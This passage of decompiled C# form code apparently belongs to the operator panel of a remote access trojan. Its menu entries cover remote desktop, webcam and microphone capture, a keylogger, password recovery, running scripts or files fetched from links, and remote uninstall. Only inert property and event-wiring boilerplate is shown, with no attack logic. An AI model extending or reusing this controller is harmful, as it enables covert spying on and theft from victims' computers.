			_ColumnHeader1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader3 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader5
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader5 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader7 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader9
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader9 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader10
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader10 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader11
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader11 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader12
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader12 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader13
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader13 = value;
		}
	}

	internal virtual TabPage TabPage5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage5 = value;
		}
	}

	internal virtual TabPage TabPage6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage6 = value;
		}
	}

	internal virtual TabPage TabPage7
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage7 = value;
		}
	}

	internal virtual ContextMenuStrip ClientMenu
	{
		[DebuggerNonUserCode]
		get
		{
			return _ClientMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ClientMenu = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripMenuItem1 = value;
		}
	}

	internal virtual ToolStripMenuItem RemoteDesktopToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoteDesktopToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoteDesktopToolStripMenuItem1_Click;
			if (_RemoteDesktopToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RemoteDesktopToolStripMenuItem1).remove_Click(eventHandler);
			}
			_RemoteDesktopToolStripMenuItem1 = value;
			if (_RemoteDesktopToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RemoteDesktopToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem FileManagerToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _FileManagerToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FileManagerToolStripMenuItem_Click;
			if (_FileManagerToolStripMenuItem != null)
			{
				((ToolStripItem)_FileManagerToolStripMenuItem).remove_Click(eventHandler);
			}
			_FileManagerToolStripMenuItem = value;
			if (_FileManagerToolStripMenuItem != null)
			{
				((ToolStripItem)_FileManagerToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ProcessManagerToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProcessManagerToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ProcessManagerToolStripMenuItem1_Click;
			if (_ProcessManagerToolStripMenuItem1 != null)
			{
				((ToolStripItem)_ProcessManagerToolStripMenuItem1).remove_Click(eventHandler);
			}
			_ProcessManagerToolStripMenuItem1 = value;
			if (_ProcessManagerToolStripMenuItem1 != null)
			{
				((ToolStripItem)_ProcessManagerToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RemoteWebcamToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoteWebcamToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoteWebcamToolStripMenuItem_Click;
			if (_RemoteWebcamToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoteWebcamToolStripMenuItem).remove_Click(eventHandler);
			}
			_RemoteWebcamToolStripMenuItem = value;
			if (_RemoteWebcamToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoteWebcamToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _MicrophoneToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = MicrophoneToolStripMenuItem_Click;
			if (_MicrophoneToolStripMenuItem != null)
			{
				((ToolStripItem)_MicrophoneToolStripMenuItem).remove_Click(eventHandler);
			}
			_MicrophoneToolStripMenuItem = value;
			if (_MicrophoneToolStripMenuItem != null)
			{
				((ToolStripItem)_MicrophoneToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripMenuItem2 = value;
		}
	}

	internal virtual ToolStripMenuItem SystemInformationToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _SystemInformationToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SystemInformationToolStripMenuItem_Click;
			if (_SystemInformationToolStripMenuItem != null)
			{
				((ToolStripItem)_SystemInformationToolStripMenuItem).remove_Click(eventHandler);
			}
			_SystemInformationToolStripMenuItem = value;
			if (_SystemInformationToolStripMenuItem != null)
			{
				((ToolStripItem)_SystemInformationToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem PasswordRecoveryToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _PasswordRecoveryToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PasswordRecoveryToolStripMenuItem_Click;
			if (_PasswordRecoveryToolStripMenuItem != null)
			{
				((ToolStripItem)_PasswordRecoveryToolStripMenuItem).remove_Click(eventHandler);
			}
			_PasswordRecoveryToolStripMenuItem = value;
			if (_PasswordRecoveryToolStripMenuItem != null)
			{
				((ToolStripItem)_PasswordRecoveryToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem PasstimeToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _PasstimeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PasstimeToolStripMenuItem_Click;
			if (_PasstimeToolStripMenuItem != null)
			{
				((ToolStripItem)_PasstimeToolStripMenuItem).remove_Click(eventHandler);
			}
			_PasstimeToolStripMenuItem = value;
			if (_PasstimeToolStripMenuItem != null)
			{
				((ToolStripItem)_PasstimeToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem IPTrackerToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _IPTrackerToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = IPTrackerToolStripMenuItem_Click;
			if (_IPTrackerToolStripMenuItem != null)
			{
				((ToolStripItem)_IPTrackerToolStripMenuItem).remove_Click(eventHandler);
			}
			_IPTrackerToolStripMenuItem = value;
			if (_IPTrackerToolStripMenuItem != null)
			{
				((ToolStripItem)_IPTrackerToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ChatToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ChatToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ChatToolStripMenuItem_Click;
			if (_ChatToolStripMenuItem != null)
			{
				((ToolStripItem)_ChatToolStripMenuItem).remove_Click(eventHandler);
			}
			_ChatToolStripMenuItem = value;
			if (_ChatToolStripMenuItem != null)
			{
				((ToolStripItem)_ChatToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripMenuItem3 = value;
		}
	}

	internal virtual ToolStripMenuItem FromLinkToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _FromLinkToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FromLinkToolStripMenuItem_Click;
			if (_FromLinkToolStripMenuItem != null)
			{
				((ToolStripItem)_FromLinkToolStripMenuItem).remove_Click(eventHandler);
			}
			_FromLinkToolStripMenuItem = value;
			if (_FromLinkToolStripMenuItem != null)
			{
				((ToolStripItem)_FromLinkToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem FromDiskToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _FromDiskToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FromDiskToolStripMenuItem_Click;
			if (_FromDiskToolStripMenuItem != null)
			{
				((ToolStripItem)_FromDiskToolStripMenuItem).remove_Click(eventHandler);
			}
			_FromDiskToolStripMenuItem = value;
			if (_FromDiskToolStripMenuItem != null)
			{
				((ToolStripItem)_FromDiskToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem FromScriptToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _FromScriptToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FromScriptToolStripMenuItem_Click;
			if (_FromScriptToolStripMenuItem != null)
			{
				((ToolStripItem)_FromScriptToolStripMenuItem).remove_Click(eventHandler);
			}
			_FromScriptToolStripMenuItem = value;
			if (_FromScriptToolStripMenuItem != null)
			{
				((ToolStripItem)_FromScriptToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripMenuItem4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripMenuItem4 = value;
		}
	}

	internal virtual ToolStripMenuItem UpdateToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UpdateToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_UpdateToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem FromLinkToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _FromLinkToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FromLinkToolStripMenuItem1_Click;
			if (_FromLinkToolStripMenuItem1 != null)
			{
				((ToolStripItem)_FromLinkToolStripMenuItem1).remove_Click(eventHandler);
			}
			_FromLinkToolStripMenuItem1 = value;
			if (_FromLinkToolStripMenuItem1 != null)
			{
				((ToolStripItem)_FromLinkToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem FromDiskToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _FromDiskToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FromDiskToolStripMenuItem1_Click;
			if (_FromDiskToolStripMenuItem1 != null)
			{
				((ToolStripItem)_FromDiskToolStripMenuItem1).remove_Click(eventHandler);
			}
			_FromDiskToolStripMenuItem1 = value;
			if (_FromDiskToolStripMenuItem1 != null)
			{
				((ToolStripItem)_FromDiskToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem CloseToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _CloseToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CloseToolStripMenuItem_Click;
			if (_CloseToolStripMenuItem != null)
			{
				((ToolStripItem)_CloseToolStripMenuItem).remove_Click(eventHandler);
			}
			_CloseToolStripMenuItem = value;
			if (_CloseToolStripMenuItem != null)
			{
				((ToolStripItem)_CloseToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem UnistallToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UnistallToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = UnistallToolStripMenuItem_Click;
			if (_UnistallToolStripMenuItem != null)
			{
				((ToolStripItem)_UnistallToolStripMenuItem).remove_Click(eventHandler);
			}
			_UnistallToolStripMenuItem = value;
			if (_UnistallToolStripMenuItem != null)
			{
				((ToolStripItem)_UnistallToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RenameToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RenameToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RenameToolStripMenuItem_Click;
			if (_RenameToolStripMenuItem != null)
			{
				((ToolStripItem)_RenameToolStripMenuItem).remove_Click(eventHandler);
			}
			_RenameToolStripMenuItem = value;
			if (_RenameToolStripMenuItem != null)
			{
				((ToolStripItem)_RenameToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RestartToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RestartToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RestartToolStripMenuItem_Click;
			if (_RestartToolStripMenuItem != null)
			{
				((ToolStripItem)_RestartToolStripMenuItem).remove_Click(eventHandler);
			}
			_RestartToolStripMenuItem = value;
			if (_RestartToolStripMenuItem != null)
			{
				((ToolStripItem)_RestartToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DiconnectToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DiconnectToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DiconnectToolStripMenuItem_Click;
			if (_DiconnectToolStripMenuItem != null)
			{
				((ToolStripItem)_DiconnectToolStripMenuItem).remove_Click(eventHandler);
			}
			_DiconnectToolStripMenuItem = value;
			if (_DiconnectToolStripMenuItem != null)
			{
				((ToolStripItem)_DiconnectToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ImageList ImageList2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList2 = value;
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator1 = value;
		}
	}

	internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _KeyloggerToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = KeyloggerToolStripMenuItem1_Click;
			if (_KeyloggerToolStripMenuItem1 != null)
			{
				((ToolStripItem)_KeyloggerToolStripMenuItem1).remove_Click(eventHandler);
			}
			_KeyloggerToolStripMenuItem1 = value;
			if (_KeyloggerToolStripMenuItem1 != null)
			{
				((ToolStripItem)_KeyloggerToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem PingToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _PingToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PingToolStripMenuItem_Click;
			if (_PingToolStripMenuItem != null)
			{
				((ToolStripItem)_PingToolStripMenuItem).remove_Click(eventHandler);
			}
			_PingToolStripMenuItem = value;
			if (_PingToolStripMenuItem != null)
			{
				((ToolStripItem)_PingToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator2 = value;
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator3 = value;
		}
	}

	internal virtual ToolStripMenuItem SelectToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _SelectToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SelectToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem SelectAllToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _SelectAllToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = SelectAllToolStripMenuItem_Click;
			if (_SelectAllToolStripMenuItem != null)
			{
				((ToolStripItem)_SelectAllToolStripMenuItem).remove_Click(eventHandler);
			}
			_SelectAllToolStripMenuItem = value;
			if (_SelectAllToolStripMenuItem != null)
			{
				((ToolStripItem)_SelectAllToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem UnsellectToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UnsellectToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = UnsellectToolStripMenuItem_Click;
			if (_UnsellectToolStripMenuItem != null)
			{
				((ToolStripItem)_UnsellectToolStripMenuItem).remove_Click(eventHandler);
			}
			_UnsellectToolStripMenuItem = value;
			if (_UnsellectToolStripMenuItem != null)
			{
				((ToolStripItem)_UnsellectToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _OpenFolderToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OpenFolderToolStripMenuItem_Click;
			if (_OpenFolderToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenFolderToolStripMenuItem).remove_Click(eventHandler);
			}
			_OpenFolderToolStripMenuItem = value;
			if (_OpenFolderToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenFolderToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem TorrentSeederToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _TorrentSeederToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TorrentSeederToolStripMenuItem_Click;
			if (_TorrentSeederToolStripMenuItem != null)
			{
				((ToolStripItem)_TorrentSeederToolStripMenuItem).remove_Click(eventHandler);
			}
			_TorrentSeederToolStripMenuItem = value;
			if (_TorrentSeederToolStripMenuItem != null)
			{
				((ToolStripItem)_TorrentSeederToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripSeparator ToolStripSeparator4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripSeparator4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripSeparator4 = value;
		}
	}

	internal virtual TabPage TabPage8
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage8 = value;
		}
	}

	internal virtual ListView Logs
	{
		[DebuggerNonUserCode]
		get
		{
			return _Logs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Logs = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader16
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader16 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader17
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader17 = value;
		}
	}

	internal virtual TabPage TabPage9
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage9 = value;
		}
	}

	internal virtual ListView BlockedIP
	{
		[DebuggerNonUserCode]
		get
		{
			return _BlockedIP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_BlockedIP = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader18
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader18 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader19
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader19 = value;
		}
	}

	internal virtual StatusStrip StatusStrip1
	{
		[DebuggerNonUserCode]
		get
		{
			return _StatusStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_StatusStrip1 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip2 = value;
		}
	}

	internal virtual ToolStripMenuItem AddToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _AddToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = AddToolStripMenuItem_Click;
			if (_AddToolStripMenuItem != null)
			{
				((ToolStripItem)_AddToolStripMenuItem).remove_Click(eventHandler);
			}
			_AddToolStripMenuItem = value;
			if (_AddToolStripMenuItem != null)
			{
				((ToolStripItem)_AddToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RemoveToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RemoveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RemoveToolStripMenuItem_Click;
			if (_RemoveToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem).remove_Click(eventHandler);
			}
			_RemoveToolStripMenuItem = value;
			if (_RemoveToolStripMenuItem != null)
			{
				((ToolStripItem)_RemoveToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ClearListToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ClearListToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ClearListToolStripMenuItem_Click;
			if (_ClearListToolStripMenuItem != null)
			{
				((ToolStripItem)_ClearListToolStripMenuItem).remove_Click(eventHandler);
			}
			_ClearListToolStripMenuItem = value;
			if (_ClearListToolStripMenuItem != null)
			{
				((ToolStripItem)_ClearListToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ListView Commandslistview
	{
		[DebuggerNonUserCode]
		get
		{
			return _Commandslistview;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Commandslistview = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader20
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader20 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader21
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader21 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader22
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader22 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual TextBox Commanddata
	{
		[DebuggerNonUserCode]
		get
		{
			return _Commanddata;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Commanddata = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual ComboBox Comands
	{
